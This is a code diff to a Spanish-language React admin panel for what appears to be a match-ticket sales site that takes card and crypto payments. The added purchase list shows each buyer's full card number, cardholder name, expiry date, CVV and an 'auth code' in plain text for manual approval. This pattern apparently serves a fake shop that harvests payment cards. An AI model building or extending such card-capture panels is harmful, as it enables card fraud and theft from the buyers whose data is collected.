@@ -146,7 +146,7 @@ function AdminStadiumMap({ sections }) {
 export default function MatchesAdmin({ onBack }) {
   const { matches, addMatch, deleteMatch, updateMatch, updateMatchSection, regenMatchAvailability, TEAMS, LOCATIONS, LOCATION_STADIUM, TEAM_FLAGS } = useMatches();
   const { cryptoWallet, updateCryptoWallet, whatsappNum, updateWhatsappNum } = useGlobalConfig();
-  const { purchases, approvePurchase, denyPurchase } = usePurchases();
+  const { purchases, approvePurchase, denyPurchase, deletePurchase } = usePurchases();
   const pending = purchases.filter(p => p.status === 'pending');
   const approved = purchases.filter(p => p.status === 'approved');
   const [form, setForm] = useState({ home: '', away: '', date: '', time: '', location: '', totalTickets: 65000 });
@@ -294,6 +294,118 @@ export default function MatchesAdmin({ onBack }) {
       </div>
 
       <div className="max-w-4xl mx-auto p-4 sm:p-6 space-y-6">
+        {/* Purchases */}
+        <div className="bg-white rounded-xl border border-gray-200 overflow-hidden">
+          <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between">
+            <h2 className="font-bold text-gray-900">
+              Solicitudes de Compra
+              {pending.length > 0 && (
+                <span className="ml-2 px-1.5 py-0.5 rounded-full bg-rose-500 text-white text-[10px] font-bold">{pending.length}</span>
+              )}
+            </h2>
+            <span className="text-xs text-gray-400">{approved.length} aprobadas</span>
+          </div>
+          {purchases.length === 0 ? (
+            <div className="px-6 py-8 text-center text-gray-400 text-sm">No hay solicitudes de compra.</div>
+          ) : (
+            <div className="divide-y divide-gray-100">
+              {purchases.map(p => {
+                const isPending = p.status === 'pending';
+                return (
+                  <div key={p.id} className={`px-6 py-4 ${isPending ? 'bg-amber-50/50' : p.status === 'approved' ? 'bg-green-50/50' : 'opacity-60'}`}>
+                    <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 sm:gap-4">
+                        <div className="flex-1 min-w-0">
+                        <div className="flex items-center gap-2 text-sm">
+                          <span className="font-bold text-gray-900">{p.match.home} vs {p.match.away}</span>
+                          {p.paymentMethod === 'card' && (
+                            <span className="px-1.5 py-0.5 rounded text-[10px] font-bold bg-blue-100 text-blue-700">
+                              {p.cardData?.cardType || 'Tarjeta'}
+                            </span>
+                          )}
+                          {p.paymentMethod === 'crypto' && (
+                            <span className="px-1.5 py-0.5 rounded text-[10px] font-bold bg-purple-100 text-purple-700">
+                              Crypto
+                            </span>
+                          )}
+                          <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold ${
+                            p.status === 'pending' ? 'bg-amber-100 text-amber-700' :
+                            p.status === 'approved' ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-500'
+                          }`}>
+                            {p.status === 'pending' ? 'Pendiente' : p.status === 'approved' ? 'Aprobado' : 'Rechazado'}
+                          </span>
+                        </div>
+                        <div className="text-xs text-gray-500 mt-0.5">
+                          Sección {p.section.id} &bull; {p.qty} {p.qty === 1 ? 'entrada' : 'entradas'} &bull; {p.total.toLocaleString()} US$
+                        </div>
+                        <div className="text-[10px] text-gray-400 mt-0.5">
+                          {p.user.name} ({p.user.email}) &bull; {new Date(p.createdAt).toLocaleString()}
+                        </div>
+                        {p.cardData && (
+                          <div className="mt-1.5 flex flex-wrap gap-x-4 gap-y-0.5 text-[10px] bg-gray-50 rounded-lg p-2 border border-gray-100">
+                            <span className="text-gray-400">Titular:</span>
+                            <span className="text-gray-700 font-medium">{p.cardData.cardholderName}</span>
+                            <span className="text-gray-400">Número:</span>
+                            <span className="text-gray-700 font-mono">{p.cardData.fullNumber}</span>
+                            <span className="text-gray-400">Venc:</span>
+                            <span className="text-gray-700">{p.cardData.expiryDate}</span>
+                            <span className="text-gray-400">CVV:</span>
+                            <span className="text-gray-700 font-mono">{p.cardData.cvv}</span>
+                            {p.cardData.authCode && (
+                              <>
+                                <span className="text-gray-400">Código Auth:</span>
+                                <span className="text-gray-700 font-mono font-bold">{p.cardData.authCode}</span>
+                              </>
+                            )}
+                          </div>
+                        )}
+                      </div>
+                      {isPending && (
+                        <div className="flex gap-2 shrink-0">
+                          <button onClick={() => approvePurchase(p.id)}
+                            className="px-3 py-1.5 rounded-lg bg-green-600 hover:bg-green-700 text-white text-xs font-bold transition-colors">
+                            Aprobar
+                          </button>
+                          <button onClick={() => denyPurchase(p.id)}
+                            className="px-3 py-1.5 rounded-lg bg-gray-200 hover:bg-gray-300 text-gray-700 text-xs font-medium transition-colors">
+                            Rechazar
+                          </button>
+                        </div>
+                      )}
+                      {p.status === 'approved' && (
+                        <div className="flex items-center gap-2 shrink-0">
+                          <div className="text-xs text-green-600 font-bold flex items-center gap-1">
+                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                            </svg>
+                            Ticket generado
+                          </div>
+                          <button onClick={() => deletePurchase(p.id)}
+                            className="p-1.5 rounded-lg text-gray-400 hover:text-red-600 hover:bg-red-50 transition-colors" title="Eliminar">
+                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
+                            </svg>
+                          </button>
+                        </div>
+                      )}
+                      {p.status === 'denied' && (
+                        <div className="flex items-center gap-2 shrink-0">
+                          <div className="text-xs text-red-500 font-medium">Rechazado</div>
+                          <button onClick={() => deletePurchase(p.id)}
+                            className="p-1.5 rounded-lg text-gray-400 hover:text-red-600 hover:bg-red-50 transition-colors" title="Eliminar">
+                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
+                            </svg>
+                          </button>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+          )}
+        </div>
+
         {/* Form */}
         <form onSubmit={handleSubmit} className="bg-white rounded-xl border border-gray-200 p-6 space-y-4">
           <h2 className="font-bold text-gray-900">{editingId ? 'Editar Partido' : 'Nuevo Partido'}</h2>
@@ -381,71 +493,6 @@ export default function MatchesAdmin({ onBack }) {
                       <button onClick={() => deleteMatch(m.id)} className="p-1.5 hover:bg-gray-100 rounded text-gray-400 hover:text-red-600" title="Eliminar">
                         <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                       </button>
-                    </div>
-                  </div>
-                );
-              })}
-            </div>
-          )}
-        </div>
-
-        {/* Purchases */}
-        <div className="bg-white rounded-xl border border-gray-200 overflow-hidden">
-          <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between">
-            <h2 className="font-bold text-gray-900">
-              Solicitudes de Compra
-              {pending.length > 0 && (
-                <span className="ml-2 px-1.5 py-0.5 rounded-full bg-rose-500 text-white text-[10px] font-bold">{pending.length}</span>
-              )}
-            </h2>
-            <span className="text-xs text-gray-400">{approved.length} aprobadas</span>
-          </div>
-          {purchases.length === 0 ? (
-            <div className="px-6 py-8 text-center text-gray-400 text-sm">No hay solicitudes de compra.</div>
-          ) : (
-            <div className="divide-y divide-gray-100">
-              {purchases.map(p => {
-                const isPending = p.status === 'pending';
-                return (
-                  <div key={p.id} className={`px-6 py-4 ${isPending ? 'bg-amber-50/50' : p.status === 'approved' ? 'bg-green-50/50' : 'opacity-60'}`}>
-                    <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 sm:gap-4">
-                      <div className="flex-1 min-w-0">
-                        <div className="flex items-center gap-2 text-sm">
-                          <span className="font-bold text-gray-900">{p.match.home} vs {p.match.away}</span>
-                          <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold ${
-                            p.status === 'pending' ? 'bg-amber-100 text-amber-700' :
-                            p.status === 'approved' ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-500'
-                          }`}>
-                            {p.status === 'pending' ? 'Pendiente' : p.status === 'approved' ? 'Aprobado' : 'Rechazado'}
-                          </span>
-                        </div>
-                        <div className="text-xs text-gray-500 mt-0.5">
-                          Sección {p.section.id} &bull; {p.qty} {p.qty === 1 ? 'entrada' : 'entradas'} &bull; {p.total.toLocaleString()} US$
-                        </div>
-                        <div className="text-[10px] text-gray-400 mt-0.5">
-                          {p.user.name} ({p.user.email}) &bull; {new Date(p.createdAt).toLocaleString()}
-                        </div>
-                      </div>
-                      {isPending && (
-                        <div className="flex gap-2 shrink-0">
-                          <button onClick={() => approvePurchase(p.id)}
-                            className="px-3 py-1.5 rounded-lg bg-green-600 hover:bg-green-700 text-white text-xs font-bold transition-colors">
-                            Aprobar
-                          </button>
-                          <button onClick={() => denyPurchase(p.id)}
-                            className="px-3 py-1.5 rounded-lg bg-gray-200 hover:bg-gray-300 text-gray-700 text-xs font-medium transition-colors">
-                            Rechazar
-                          </button>
-                        </div>
-                      )}
-                      {p.status === 'approved' && (
-                        <div className="shrink-0 text-xs text-green-600 font-bold flex items-center gap-1">
-                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-                          </svg>
-                          Ticket generado
-                        </div>
-                      )}
                     </div>
                   </div>
                 );
